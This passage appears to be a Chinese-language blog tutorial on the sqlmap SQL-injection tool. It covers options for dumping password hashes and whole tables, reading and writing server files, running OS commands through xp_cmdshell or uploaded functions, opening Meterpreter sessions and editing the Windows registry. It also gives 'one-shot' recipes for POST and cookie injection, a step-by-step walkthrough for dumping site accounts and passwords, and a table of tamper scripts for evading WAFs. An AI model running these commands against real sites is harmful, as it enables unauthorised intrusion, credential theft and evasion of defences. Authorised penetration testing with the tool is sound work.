当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户 </p><h5 id="6-列出并破解数据库用户的hash"><a href="#6-列出并破解数据库用户的hash" class="headerlink" title="6.列出并破解数据库用户的hash"></a>6.列出并破解数据库用户的hash</h5><p>参数：–passwords</p><p> 当前用户有权限读取包含用户密码的库的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><p>   python sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –passwords -v 1</p><p>  也可以提供-U参数来指定爆破哪个用户的hash </p><h5 id="7-列出数据库管理员权限"><a href="#7-列出数据库管理员权限" class="headerlink" title="7.列出数据库管理员权限"></a>7.列出数据库管理员权限</h5><p>参数：–privileges    当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限 </p><h5 id="8-列出数据库管理员角色"><a href="#8-列出数据库管理员角色" class="headerlink" title="8.列出数据库管理员角色"></a>8.列出数据库管理员角色</h5><p>   参数：–roles<br>   当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色</p><p>  仅适用于当前数据库是Oracle的时候</p><h5 id="9-列出数据库系统的数据库"><a href="#9-列出数据库系统的数据库" class="headerlink" title="9.列出数据库系统的数据库"></a>9.列出数据库系统的数据库</h5><p>参数：–dbs    当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库</p><h5 id="10-列举数据库表"><a href="#10-列举数据库表" class="headerlink" title="10.列举数据库表"></a>10.列举数据库表</h5><p>   参数：–tables,–exclude-sysdbs,-D<br>   当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</p><p>  –exclude-sysdbs参数是指排除包含了所有数据库名的系统数据库。</p><p>  需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 </p><h5 id="11-列举数据库表中的字段"><a href="#11-列举数据库表中的字段" class="headerlink" title="11.列举数据库表中的字段"></a>11.列举数据库表中的字段</h5><p>参数：–columns,-C,-T,-D<br>当前用户有权限读取包含所有数据库表信息的表中数据的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</p><p>如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><h5 id="12-获取表中数据个数"><a href="#12-获取表中数据个数" class="headerlink" title="12.获取表中数据个数"></a>12.获取表中数据个数</h5><p>参数：–count    有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数 </p><h5 id="13-获取整个表的数据"><a href="#13-获取整个表的数据" class="headerlink" title="13.获取整个表的数据"></a>13.获取整个表的数据</h5><p> 参数：–dump,-C,-T,-D,–start,–stop,–first,–last<br> 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。</p><p> 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。<br> 可以获取指定库中的所有表的内容，使用–dump跟-D参数（不使用-T与-C参数）。</p><p>sqlmap为每个表生成了一个CSV文件。</p><p>  如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可使用–stop 1，如果想获取第二段与第三段数据，使用参数–start 1 –stop 3。</p><p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，这些参数只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><h5 id="14-获取所有数据库表的内容"><a href="#14-获取所有数据库表的内容" class="headerlink" title="14.获取所有数据库表的内容"></a>14.获取所有数据库表的内容</h5><p>参数：–dump-all,–exclude-sysdbs    使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中，master数据库没有被考虑成为一个系统数据库，因为有的管理员会把当用户数据库一样来使用它。</p><h5 id="15-搜索字段，表，数据库"><a href="#15-搜索字段，表，数据库" class="headerlink" title="15.搜索字段，表，数据库"></a>15.搜索字段，表，数据库</h5><p>   参数：–search,-C,-T,-D<br>   –search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。<br>   可以在一下三种情况下使用：</p><p>  -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</p><p>  -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</p><p>  -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</p><h5 id="16-运行自定义的SQL语句"><a href="#16-运行自定义的SQL语句" class="headerlink" title="16.运行自定义的SQL语句"></a>16.运行自定义的SQL语句</h5><p>参数：–sql-query,–sql-shell<br>sqlmap默认会自动检测确定使用哪种SQL注入技术，如何插入检索语句。</p><p>如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。</p><h2 id="九、爆破"><a href="#九、爆破" class="headerlink" title="九、爆破"></a>九、爆破</h2><h5 id="1-暴力破解表名"><a href="#1-暴力破解表名" class="headerlink" title="1.暴力破解表名"></a>1.暴力破解表名</h5><p>参数：–common-tables<br>当使用–tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：</p><p>1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是MicrossoftAccess，系统表MSysObjects是不可读的（默认）。</p><p>3、当前用户没有权限读取系统中保存数据结构的表的权限。</p><p>  暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。</p><h5 id="2-暴力破解列名"><a href="#2-暴力破解列名" class="headerlink" title="2.暴力破解列名"></a>2.暴力破解列名</h5><p>参数：–common-columns    </p><p>与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。</p><h2 id="十、用户自定义函数注入"><a href="#十、用户自定义函数注入" class="headerlink" title="十、用户自定义函数注入"></a>十、用户自定义函数注入</h2><p>用户自定义函数（UDF）    参数：–udf-inject,–shared-lib    你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中的共享库，DLL，或者Linux/Unix中共享对象，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p><h2 id="十一、系统文件操作"><a href="#十一、系统文件操作" class="headerlink" title="十一、系统文件操作"></a>十一、系统文件操作</h2><h5 id="1-从数据库服务器中读取文件"><a href="#1-从数据库服务器中读取文件" class="headerlink" title="1.从数据库服务器中读取文件"></a>1.从数据库服务器中读取文件</h5><p>参数：–file-read    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><h5 id="2-把文件上传到数据库服务器中"><a href="#2-把文件上传到数据库服务器中" class="headerlink" title="2.把文件上传到数据库服务器中"></a>2.把文件上传到数据库服务器中</h5><p>参数：–file-write,–file-dest    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。 </p><h2 id="十二、操作系统"><a href="#十二、操作系统" class="headerlink" title="十二、操作系统"></a>十二、操作系统</h2><h5 id="1-运行任意操作系统命令"><a href="#1-运行任意操作系统命令" class="headerlink" title="1.运行任意操作系统命令"></a>1.运行任意操作系统命令</h5><p>参数：–os-cmd,–os-shell<br>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</p><p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()，那么他创建的这两个函数可以执行系统命令。</p><p>在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。</p><p>用–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。</p><p>  当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：</p><p>1、ASP</p><p>2、ASP.NET</p><p>3、JSP</p><p>4、PHP</p><h5 id="2-Meterpreter配合使用"><a href="#2-Meterpreter配合使用" class="headerlink" title="2.Meterpreter配合使用"></a>2.Meterpreter配合使用</h5><p>参数：–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path    </p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：</p><p>1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：–os-pwn。</p><p>2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：–os-pwn。</p><p>3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），–os-smbrelay。</p><p>4、通过溢出Microsoft SQL Server2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：–os-bof </p><h2 id="十三、对windows注册表操作"><a href="#十三、对windows注册表操作" class="headerlink" title="十三、对windows注册表操作"></a>十三、对windows注册表操作</h2><p>满足以下条件就可以对Windows注册表进行操作：</p><p>目标数据库管理系统是运行在Windows上的</p><p>目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server</p><p>支持堆查询</p><p>目标数据库管理系统当前用户有足够的权限</p><h5 id="1-读Windows注册表键值"><a href="#1-读Windows注册表键值" class="headerlink" title="1.读Windows注册表键值"></a>1.读Windows注册表键值</h5><p>  参数：–reg-read</p><h5 id="2-写Windows注册表键值"><a href="#2-写Windows注册表键值" class="headerlink" title="2.写Windows注册表键值"></a>2.写Windows注册表键值</h5><p>   参数：–reg-add</p><h5 id="3-删除Windows注册表键值"><a href="#3-删除Windows注册表键值" class="headerlink" title="3.删除Windows注册表键值"></a>3.删除Windows注册表键值</h5><p>   参数：–reg-del </p><p>4.注册表辅助选项</p><p>  参数：–reg-key、–reg-value、–reg-data和–reg-type</p><p>  适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以交互方式提供数据。</p><p>–reg-key：指定Windows注册表键值的路径</p><p>–reg-value：指定Windows注册表键值的键</p><p>–reg-data：指定Windows注册表键值的值</p><p>–reg-type：指定Windows注册表键值的值的数据类型</p><h2 id="十四、其他"><a href="#十四、其他" class="headerlink" title="十四、其他"></a>十四、其他</h2><h5 id="1-使用简写"><a href="#1-使用简写" class="headerlink" title="1.使用简写"></a>1.使用简写</h5><p>  参数：-z</p><p>  有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy –technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。</p><p>  利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如：<br>   python sqlmap.py -z “bat,randoma,ign,tec=BEU” -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">www.target.com/vuln.php?id=1&quot;</a></p><h5 id="2-在成功检测到注入点时报警"><a href="#2-在成功检测到注入点时报警" class="headerlink" title="2.在成功检测到注入点时报警"></a>2.在成功检测到注入点时报警</h5><p>  参数：–alert</p><p>  该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如：</p><p>   python sqlmap.py -r data.txt –alert “notify-send ‘找到漏洞了’“</p><p>  上例中用于发出警报的命令是Ubuntu中的notify-send命令</p><h5 id="3-设置问题的回答"><a href="#3-设置问题的回答" class="headerlink" title="3.设置问题的回答"></a>3.设置问题的回答</h5><p>  参数：–answers</p><p>  使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如：</p><p>  python sqlmap.py -u “<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E" target="_blank" rel="noopener">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1&quot;--technique=E</a> –answers=”extending=N” –batch</p><h5 id="4-在成功检测到注入点时发出“嘟”声"><a href="#4-在成功检测到注入点时发出“嘟”声" class="headerlink" title="4.在成功检测到注入点时发出“嘟”声"></a>4.在成功检测到注入点时发出“嘟”声</h5><p>  参数：–beep</p><p>  使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用</p><h5 id="5-清除sqlmap创建的临时表和自定义函数"><a href="#5-清除sqlmap创建的临时表和自定义函数" class="headerlink" title="5.清除sqlmap创建的临时表和自定义函数"></a>5.清除sqlmap创建的临时表和自定义函数</h5><p>  参数：–cleanup</p><p>  强烈推荐在测试结束后使用此参数清除sqlmap创建的临时表和自定义函数，sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。</p><h5 id="6-检查依赖"><a href="#6-检查依赖" class="headerlink" title="6.检查依赖"></a>6.检查依赖</h5><p>  参数：–dependencies</p><p>  sqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如：</p><p>  python sqlmap.py –dependencies</p><h5 id="7-关闭彩色输出"><a href="#7-关闭彩色输出" class="headerlink" title="7.关闭彩色输出"></a>7.关闭彩色输出</h5><p>参数：–disable-coloring</p><h5 id="8-指定使用Google-dork结果的某页"><a href="#8-指定使用Google-dork结果的某页" class="headerlink" title="8.指定使用Google dork结果的某页"></a>8.指定使用Google dork结果的某页</h5><p>  参数：–gpage</p><p>  使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。</p><h5 id="9-使用HTTP参数污染"><a href="#9-使用HTTP参数污染" class="headerlink" title="9.使用HTTP参数污染"></a>9.使用HTTP参数污染</h5><p>  参数：–hpp</p><p>  HTTP参数污染是绕过WAF/IPS/IDS的一种技术，这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。</p><h5 id="10-彻底检测WAF-IPS-IDS"><a href="#10-彻底检测WAF-IPS-IDS" class="headerlink" title="10.彻底检测WAF/IPS/IDS"></a>10.彻底检测WAF/IPS/IDS</h5><p>  参数：–identify-waf</p><p>  sqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。</p><p>  python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –identify-waf -v 3</p><p>参数：–skip-waf</p><p>  默认地sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。</p><h5 id="11-模仿智能手机"><a href="#11-模仿智能手机" class="headerlink" title="11.模仿智能手机"></a>11.模仿智能手机</h5><p>  参数：–mobile</p><p>  有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种</p><h5 id="12-离线模式（仅仅使用会话数据）"><a href="#12-离线模式（仅仅使用会话数据）" class="headerlink" title="12.离线模式（仅仅使用会话数据）"></a>12.离线模式（仅仅使用会话数据）</h5><p>  参数：–offline</p><p>  添加此参数，sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。</p><h5 id="13-在Google-dork中展示页面权重"><a href="#13-在Google-dork中展示页面权重" class="headerlink" title="13.在Google dork中展示页面权重"></a>13.在Google dork中展示页面权重</h5><p>  参数：–page-rank</p><p>  与参数“-g”一起使用，这会使sqlmap向Google发起更多的请求并展示页面权重</p><h5 id="14-从输出目录中安全移除所有内容"><a href="#14-从输出目录中安全移除所有内容" class="headerlink" title="14.从输出目录中安全移除所有内容"></a>14.从输出目录中安全移除所有内容</h5><p>  参数：–purge-output</p><p>当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如：</p><p> python sqlmap.py –purge-output -v 3</p><h5 id="15-快速扫描"><a href="#15-快速扫描" class="headerlink" title="15.快速扫描"></a>15.快速扫描</h5><p>  参数：–smart</p><p>  当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。</p><h5 id="16-通过关键词使用或跳过payload"><a href="#16-通过关键词使用或跳过payload" class="headerlink" title="16.通过关键词使用或跳过payload"></a>16.通过关键词使用或跳过payload</h5><p>  参数：–test-filter</p><p>  若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子：</p><p>  python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –batch –test-filter=ROW</p><p>  参数：–test-skip</p><p>  若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。</p><h5 id="17-交互式sqlmap-Shell"><a href="#17-交互式sqlmap-Shell" class="headerlink" title="17.交互式sqlmap Shell"></a>17.交互式sqlmap Shell</h5><p>  参数：–sqlmap-shell</p><p>  使用此参数可以打开一个交互式的sqlmap Shell，支持历史记录。</p><h5 id="18-为初学者准备的简单向导"><a href="#18-为初学者准备的简单向导" class="headerlink" title="18.为初学者准备的简单向导"></a>18.为初学者准备的简单向导</h5><p>  参数：–wizard</p><p>  sqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。</p><h2 id="一把梭之脚本"><a href="#一把梭之脚本" class="headerlink" title="一把梭之脚本"></a>一把梭之脚本</h2><h4 id="穿WAF脚本"><a href="#穿WAF脚本" class="headerlink" title="穿WAF脚本"></a>穿WAF脚本</h4><p>   脚本穿waf(space2hash.py，base64encode.py, charencode.py不同的的脚本针对不同的数据库或者开发环境)： </p><p>  -u xxx -v 3 –dbs –batch –tamper”space2morehash.py”</p><h2 id="一把梭之Post注入"><a href="#一把梭之Post注入" class="headerlink" title="一把梭之Post注入"></a>一把梭之Post注入</h2><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h5><p>sqlmap.py -r test.txt -p “抓包到的post数据里面的其中一个post参数” –dbs</p><p>  解释意思：sqlamp进行post注入并且假如存在注入就返回数据库的信息，test.txt文档就是对网页抓到的包全选数据包内容然后保存为test.txt文件，直接-r test.txt是把文档放在与sqlmap同一目录下的才行。-p是指定参数注入，更精准</p><p>  假如不是放在与sqlmap同一目录下的话，那么就是sqlmap.py -r D:\test.txt -p “抓包到的post数据里面的其中一个post参数” –dbs</p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h5><p>sqlmap.py -u “存在注入的url,一般多用于后台” –data=”抓到的post包的最后一行的内容” -p “指定post包里面的某一个参数”</p><h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三:"></a>方法三:</h5><p>假设有个网站，url地址为</p><p><a href="http://www.127.0.0.1/base64?id=10" target="_blank" rel="noopener">http://www.127.0.0.1/base64?id=10</a></p><p>假如想测试这个页面是否有post注入用这个方式:</p><p>sqlmap.py -u “<a href="http://www.127.0.0.1/base64”" target="_blank" rel="noopener">http://www.127.0.0.1/base64”</a> –data=”id=10” -f –banner –dbs</p><h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四:"></a>方法四:</h5><p>自动注入方法</p><p>sqlmap.py -u “<a href="http://xxxxxx.com(cn/net/org)/login.asp(php,aspx,jsp等程序格式)”" target="_blank" rel="noopener">http://xxxxxx.com(cn/net/org)/login.asp(php,aspx,jsp等程序格式)”</a> –forms      </p><p>一般用于后台注入。</p><h2 id="一把梭之cookie注入"><a href="#一把梭之cookie注入" class="headerlink" title="一把梭之cookie注入"></a>一把梭之cookie注入</h2><h5 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一:"></a>方法一:</h5><p>假设有个网站，url地址为<a href="http://www.127.0.0.1/base32?id=45" target="_blank" rel="noopener">http://www.127.0.0.1/base32?id=45</a></p><p>假如想测试这个页面是否有cookie注入</p><p>采用的注入方式如下:sqlmap.py -u “<a href="http://www.127.0.0.1/base32”" target="_blank" rel="noopener">http://www.127.0.0.1/base32”</a> –data=”id=10” –dbs –level 2</p><p>解释：level 2是探测等级的意思，这里采用注入选择探测等级为2，当探测等级为2或2以上sqlmap是会尝试注入cookie参数的</p><h5 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二:"></a>方法二:</h5><p>sqlmap.py -u “存在注入url” –cookie=”抓包抓到的cookie”</p><p>或者是这样使用:sqlmap.py -u “存在注入url” –cookir=”抓包抓到的cookie” –level 2    //前面讲过了探测等级为2就注入cookie参数的</p><h2 id="一次sqlmap注入某注入点并且dump出账号密码全程"><a href="#一次sqlmap注入某注入点并且dump出账号密码全程" class="headerlink" title="一次sqlmap注入某注入点并且dump出账号密码全程"></a>一次sqlmap注入某注入点并且dump出账号密码全程</h2><p>判断注入点:sqlmap.py -u “存在注入url”</p><p>爆出所有数据库名字:sqlmap.py -u “存在注入url” –dbs</p><p>查看当前使用账号:sqlmap.py -u “存在注入url” –current-user</p><p>//打**的是关键看我下面的四步走</p><p>1、**查看当前数据库:sqlmap.py -u “存在注入url” –current-db</p><p>2、**列出数据库中所有表:sqlmap.py -u “存在注入url” –tables，除了这样也可以这样整，如下所示:sqlmap.py -u “存在注入url” -D “当前数据库名” –tables   //解释说明：-D是指定数据库名称。</p><p>3、**-T是指定列要出字段的表，就是数据库中的表名。</p><p>列出数据库中的表中的字段:sqlmap.py -u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” –columns。</p><p>4、**跑出来表中的字段然后暴力拆解账号和密码,一般字段账号密码都是user/pass/password/username/keyword这些等等，自己找敏感的字段然后进行拆解。</p><p>-C指定要暴力拆解的字段</p><p>暴力拆解账号密码:sqlmap.py -u “存在注入url ” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “username,password,email(columns(字段)中疑似网站账号密码邮箱等敏感字段，举例子说明)” –dump</p><p> –dump将结果导出。</p><p>四步走有异曲同工之处，不管是什么方式的注入他们的方法都不会变。</p><h1 id="SQLMAP-–tamper-绕过WAF脚本"><a href="#SQLMAP-–tamper-绕过WAF脚本" class="headerlink" title="SQLMAP –tamper 绕过WAF脚本"></a>SQLMAP –tamper 绕过WAF脚本</h1><table><thead><tr><th>支持的数据库</th><th>编号</th><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>all</td><td>1</td><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td></td><td>2</td><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td></td><td>3</td><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td></td><td>4</td><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td></td><td>5</td><td>nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如  .replace（“SELECT”、””)） filters</td></tr><tr><td></td><td>6</td><td>space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td></tr><tr><td></td><td>7</td><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td></td><td>8</td><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>mssql</td><td>9</td><td>space2hash.py</td><td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td></tr><tr><td></td><td>10</td><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td></td><td>11</td><td>space2mssqlblank.py(mssql)</td><td>空格替换为其它空符号</td></tr><tr><td></td><td>12</td><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td></td><td>13</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>14</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>15</td><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td></td><td>16</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>17</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>18</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>19</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>mysql &gt;= 5.1.13</td><td>20</td><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td></td><td>21</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>22</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>23</td><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td></td><td>24</td><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td></td><td>25</td><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td></td><td>26</td><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td></td><td>27</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>28</td><td>modsecurityzeroversioned.py</td><td>包含了完整的查询与零版本注释</td></tr><tr><td></td><td>29</td><td>space2mysqldash.py</td><td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td></tr><tr><td></td><td>30</td><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like</td></tr><tr><td></td><td>31</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>32</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>33</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>34</td><td>versionedkeywords.py</td><td>Encloses each non-function keyword with versioned MySQL comment</td></tr><tr><td></td><td>35</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td></td><td>36</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>37</td><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>MySQL &lt; 5.1</td><td>38</td><td>halfversionedmorekeywords.py</td><td>关键字前加注释</td></tr><tr><td></td><td>39</td><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>MySQL &gt;= 5.1.13</td><td>40</td><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>Oracle</td><td>41</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>42</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>43</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>44</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>45</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>46</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>47</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>PostgreSQL</td><td>48</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td></td><td>49</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td></td><td>50</td><td>between.py</td><td>用between替换大于号（&gt;）</td></tr><tr><td></td><td>51</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td></tr><tr><td></td><td>52</td><td>charencode.py</td><td>url编码</td></tr><tr><td></td><td>53</td><td>randomcase.py</td><td>随机大小写</td></tr><tr><td></td><td>54</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td></tr><tr><td></td><td>55</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td></tr><tr><td>Access</td><td>56</td><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>其他</td><td>57</td><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td></td><td>58</td><td>unmagicquotes.py</td><td>宽字符绕过 GPC  addslashes</td></tr><tr><td></td><td>59</td><td>randomcomments.py</td><td>用/**/分割sql关键字</td></tr></tbody></table><p><strong>SQLMAP实战操作：</strong></p><p><strong>1.ACCESS数据库：</strong></p><p><code>sqlmap.py -u “url” /*-u为常规扫描参数*/</code></p><p><code>sqlmap.py -u “url” –tables /*–tables拆数据库表*/</code></p><p><code>sqlmap.py -u “url” –columns -T “要拆的表名”/*列出指定表名*/</code></p><p><code>sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” 